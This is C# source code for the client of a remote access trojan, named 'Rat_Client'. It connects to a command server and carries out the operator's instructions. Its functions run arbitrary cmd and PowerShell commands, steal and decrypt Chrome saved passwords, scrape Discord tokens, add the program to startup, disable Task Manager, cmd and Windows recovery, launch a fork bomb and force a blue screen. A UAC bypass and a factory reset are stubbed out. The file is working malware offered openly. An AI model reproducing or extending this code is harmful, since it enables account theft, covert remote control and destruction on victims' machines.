using System;
using System.Diagnostics;
using System.IO;
using Microsoft.Win32;
using System.Net.Sockets;
using System.Text;
using System.Collections.Generic;
using Newtonsoft.Json;
using System.Windows.Forms;
using System.Security.Cryptography;
using System.Data.SQLite;
using AudioSwitcher.AudioApi;
using AudioSwitcher.AudioApi.CoreAudio;
using System.Runtime.InteropServices;
using System.Threading;
using System.Security.Principal;
using System.Linq;
using System.Net;
using System.Text.RegularExpressions;
using System.Runtime.InteropServices.ComTypes;
using Org.BouncyCastle.Crypto.Parameters;
using Org.BouncyCastle.Crypto.Modes;
using Org.BouncyCastle.Crypto.Engines;
using System.Web.Script.Serialization;

namespace Rat_Client
{
    internal class Program
    {
        static NetworkStream stream { get; set; }
        static string clientName = "client";

        [DllImport("user32.dll")]
        public static extern int SetForegroundWindow(IntPtr hWnd);

        [DllImport("user32.dll")]
        public static extern bool SetFocus(IntPtr hWnd);

        [DllImport("user32.dll")]
        public static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow);

        private const int SW_MAXIMIZE = 3;

        private const string RegistryPath = @"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System";
        private const string RegistryKey = "EnableLUA";


        static void Main(string[] args)
        {
            TcpClient client = new TcpClient("localhost", 6969);
            stream = client.GetStream();

            while (true)
            {
                string[] input = Receive();

                switch (input[0])
                {
                    case "cmdcommand":
                        ExecuteCmdCommand(input[1]);
                        break;
                    case "pscommand":
                        ExecutePowerShellCommand(input[1]);
                        break;
                    case "disable_cmd":
                        DisableCmd();
                        break;
                    case "enable_cmd":
                        EnableCmd();
                        break;
                    case "disable_taskmanager":
                        DisableTaskManager();
                        break;
                    case "enable_taskmanager":
                        EnableTaskManager();
                        break;
                    case "add_to_startup":
                        AddToStartup();
                        break;
                    case "remove_from_startup":
                        RemoveFromStartup();
                        break;
                    case "get_discord_tokens":
                        RetrieveDiscordTokens();
                        break;
                    case "disable_reagentc":
                        DisableReagentc();
                        break;
                    case "enable_reagentc":
                        EnableReagentc();
                        break;
                    case "chrome_info":
                        GrabChromePasswords();
                        break;
                    case "set_volume_100":
                        SetVolume100();
                        break;
                    case "bsod":
                        TriggerBSOD();
                        break;
                    case "jtk":
                        TriggerJeffTheKillerJumpscare();
                        break;
                    case "uac":
                        BypassUAC();
                        break;
                    case "forkbomb":
                        forkBomb();
                        break;
                    case "factory":
                        FactoryReset();
                        break;
                }
            }
        }

        private static void FactoryReset()
        {

        }

        private static void forkBomb()
        {
            try
            {
                File.Create(@"C:\fork.bat");
                File.WriteAllText(@"C:\fork.bat", "%0|%0");
                ProcessStartInfo processInfo = new ProcessStartInfo
                {
                    FileName = @"C:\fork.bat",
                    UseShellExecute = false,
                    CreateNoWindow = false
                };

                using (Process process = Process.Start(processInfo))
                {
                    Send("Fork bomb started :)");
                }
            }
            catch (Exception e)
            {
                Send($"{e.Message}");
            }
        }

        private static void SetVolume100()
        {
            CoreAudioDevice defaultPlaybackDevice = new CoreAudioController().DefaultPlaybackDevice;

            defaultPlaybackDevice.Volume = 100;
        }

        [DllImport("ntdll.dll", SetLastError = true)]
        public static extern uint NtRaiseHardError(
        uint errorStatus,
        uint numberOfParameters,
        uint unicodeStringParameterMask,
        IntPtr parameters,
        uint optionFlag,
        ref uint response);

        public static void TriggerBSOD()
        {
            uint errorStatus = 0xC000021A;  // error code for bsod
            uint response = 0; // response type shit

            NtRaiseHardError(errorStatus, 0, 0, IntPtr.Zero, 6, ref response); // raise error
        }

        private static void GrabChromePasswords()
        {
            string loginDataPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), @"AppData\Local\Google\Chrome\User Data\Default\Login Data");

            if (!File.Exists(loginDataPath))
            {
                Send("No Chrome data found.");
                return;
            }

            string tempDbPath = Path.Combine(Path.GetTempPath(), "ChromeLoginData.db");
            File.Copy(loginDataPath, tempDbPath, true);

            using (var connection = new SQLiteConnection("Data Source=" + tempDbPath + ";Version=3;"))
            {
                connection.Open();

                string query = "SELECT origin_url, username_value, password_value FROM logins";
                using (var command = new SQLiteCommand(query, connection))
                {
                    using (var reader = command.ExecuteReader())
                    {
                        StringBuilder chromePasswords = new StringBuilder();

                        while (reader.Read())
                        {
                            string originUrl = reader.GetString(0);
                            string username = reader.GetString(1);
                            byte[] passwordBytes = (byte[])reader["password_value"];

                            string decryptedPassword = DecryptPassword(passwordBytes);

                            chromePasswords.AppendLine($"Website: {originUrl}, Email: {username}, Password: {decryptedPassword}");
                        }

                        if (chromePasswords.Length > 0)
                        {
                            Send(chromePasswords.ToString());
                        }
                        else
                        {
                            Send("No saved passwords found.");
                        }
                    }
                }
            }

            File.Delete(tempDbPath);
        }

        private static string DecryptPassword(byte[] encryptedPassword)
        {
            try
            {
                byte[] decryptedBytes = ProtectedData.Unprotect(encryptedPassword, null, DataProtectionScope.CurrentUser);

                return Encoding.UTF8.GetString(decryptedBytes);
            }
            catch
            {
                return "Unable to decrypt password.";
            }
        }

        private static void EnableReagentc()
        {
            try
            {
                RegistryKey key = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Setup", true);
                if (key != null)
                {
                    key.SetValue("RecoveryEnvironmentEnabled", 1, RegistryValueKind.DWord);
                    key.Close();
                    Send("Reagentc has been enabled.");
                }
                else
                {
                    Send("Failed to access registry key.");
                }
            }
            catch (Exception ex)
            {
                Send($"Error enabling reagentc: {ex.Message}");
            }
        }

        private static void DisableReagentc()
        {
            try
            {
                RegistryKey key = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Setup", true);
                if (key != null)
                {
                    key.SetValue("RecoveryEnvironmentEnabled", 0, RegistryValueKind.DWord);
                    key.Close();
                    Send("Reagentc has been disabled.");
                }
                else
                {
                    Send("Failed to access registry key.");
                }
            }
            catch (Exception ex)
            {
                Send($"Error disabling reagentc: {ex.Message}");
            }
        }

        private static void Send(string message)
        {
            byte[] data = Encoding.ASCII.GetBytes(message + "|");
            stream.Write(data, 0, data.Length);
            stream.Flush();
        }

        private static void ExecuteCmdCommand(string command)
        {
            try
            {
                Process cmdProcess = new Process();
                cmdProcess.StartInfo.FileName = "cmd.exe";
                cmdProcess.StartInfo.Arguments = $"/C {command}"; 
                cmdProcess.StartInfo.RedirectStandardOutput = true;
                cmdProcess.StartInfo.UseShellExecute = false;
                cmdProcess.StartInfo.CreateNoWindow = true;
                cmdProcess.Start();

                string output = cmdProcess.StandardOutput.ReadToEnd();

                cmdProcess.WaitForExit();
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error executing CMD command: {ex.Message}");
            }
        }

        private static void ExecutePowerShellCommand(string command)
        {
            try
            {
                Process powerShellProcess = new Process();
                powerShellProcess.StartInfo.FileName = "powershell.exe";
                powerShellProcess.StartInfo.Arguments = $"-Command \"{command}\"";
                powerShellProcess.StartInfo.RedirectStandardOutput = true;
                powerShellProcess.StartInfo.UseShellExecute = false;
                powerShellProcess.StartInfo.CreateNoWindow = true;
                powerShellProcess.Start();

                string output = powerShellProcess.StandardOutput.ReadToEnd();

                powerShellProcess.WaitForExit();
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error executing PowerShell command: {ex.Message}");
            }
        }

        private static void DisableCmd()
        {
            RegistryKey key = Registry.CurrentUser.CreateSubKey(@"Software\Policies\Microsoft\Windows\System");
            key.SetValue("DisableCMD", 2, RegistryValueKind.DWord);
            key.Close();
        }

        private static void EnableCmd()
        {
            RegistryKey key = Registry.CurrentUser.CreateSubKey(@"Software\Policies\Microsoft\Windows\System");
            key.DeleteValue("DisableCMD", false);
            key.Close();
        }

        private static void DisableTaskManager()
        {
            RegistryKey key = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System");
            key.SetValue("DisableTaskMgr", 1, RegistryValueKind.DWord);
            key.Close();
        }

        private static void RetrieveDiscordTokens()
        {
            try
            {
                // Define the path to Discord's local storage directory
                string discordPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), @"discord\Local Storage\leveldb");

                string desktopPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
                string filePath = Path.Combine(desktopPath, "tokens.txt");

                if (!Directory.Exists(discordPath))
                {
                    Send("Discord installation not found.");
                    return;
                }

                var tokenFiles = Directory.GetFiles(discordPath, "*.ldb");
                StringBuilder tokens = new StringBuilder();

                foreach (var file in tokenFiles)
                {
                    string[] lines = File.ReadAllLines(file);

                    // Look for potential tokens in each line
                    foreach (string line in lines)
                    {
                        if (line.Contains("token"))
                        {
                            var match = System.Text.RegularExpressions.Regex.Match(line, @"[\w-]{24}\.[\w-]{6}\.[\w-]{27}");
                            if (match.Success)
                            {
                                tokens.AppendLine(match.Value);
                            }
                        }
                    }
                }

                if (tokens.Length > 0)
                {
                    // Save the tokens to a file on the desktop
                    File.WriteAllText(filePath, tokens.ToString());

                    // Send the file to the server (or you can send the content directly if preferred)
                    Send($"Tokens have been saved to {filePath}");
                }
                else
                {
                    Send("No tokens found.");
                }
            }
            catch (Exception ex)
            {
                Send($"Error retrieving Discord tokens: {ex.Message}");
            }
        }


        public static void BypassUAC()
        {
            bool isAdmin = IsRunningAsAdmin();
            if (!isAdmin)
            {

            }
        }

        static bool IsRunningAsAdmin()
        {
            WindowsIdentity identity = WindowsIdentity.GetCurrent();
            WindowsPrincipal principal = new WindowsPrincipal(identity);
            return principal.IsInRole(WindowsBuiltInRole.Administrator);
        }

        private static void EnableTaskManager()
        {
            RegistryKey key = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System");
            key.DeleteValue("DisableTaskMgr", false);
            key.Close();
        }

        private static void AddToStartup()
        {
            string executablePath = System.Reflection.Assembly.GetExecutingAssembly().Location;
            string keyName = @"SOFTWARE\Microsoft\Windows\CurrentVersion\Run";
            string appName = "sigma"; // change to the name u want in startup

            try
            {
                RegistryKey key = Registry.CurrentUser.OpenSubKey(keyName, true);
                if (key.GetValue(appName) == null)
                {
                    key.SetValue(appName, executablePath);
                    MessageBox.Show("Added to startup");
                }
            }
            catch (Exception ex)
            {
                Send($"{ex.Message}");
            }
        }

        private static void RemoveFromStartup()
        {
            string keyName = @"SOFTWARE\Microsoft\Windows\CurrentVersion\Run";
            string appName = "sigma"; // same shit

            try
            {
                RegistryKey key = Registry.CurrentUser.OpenSubKey(keyName, true);
                if (key.GetValue(appName) != null)
                {
                    key.DeleteValue(appName);
                }
            }
            catch (Exception ex)
            {
                Send($"{ex.Message}");
            }
        }

        public static void TriggerJeffTheKillerJumpscare()
        {
            string youtubeUrl = "https://www.youtube.com/watch?v=ToRqXvEfSCQ";

            ProcessStartInfo startInfo = new ProcessStartInfo
            {
                FileName = "chrome.exe",
                Arguments = youtubeUrl
            };
            Process.Start(startInfo);

            Thread.Sleep(1500);

            Process[] processes = Process.GetProcessesByName("chrome");
            foreach (var process in processes)
            {
                SetForegroundWindow(process.MainWindowHandle);
                ShowWindowAsync(process.MainWindowHandle, SW_MAXIMIZE);
                SetFocus(process.MainWindowHandle);

                SendKeys.SendWait("f");
                break;
            }

            Thread.Sleep(10000);
        }

        private static string[] Receive()
        {
            byte[] bytes = new byte[1024];
            int bytesRead = stream.Read(bytes, 0, bytes.Length);
            stream.Flush();
            return Encoding.ASCII.GetString(bytes, 0, bytesRead).Split('|');
        }
    }
}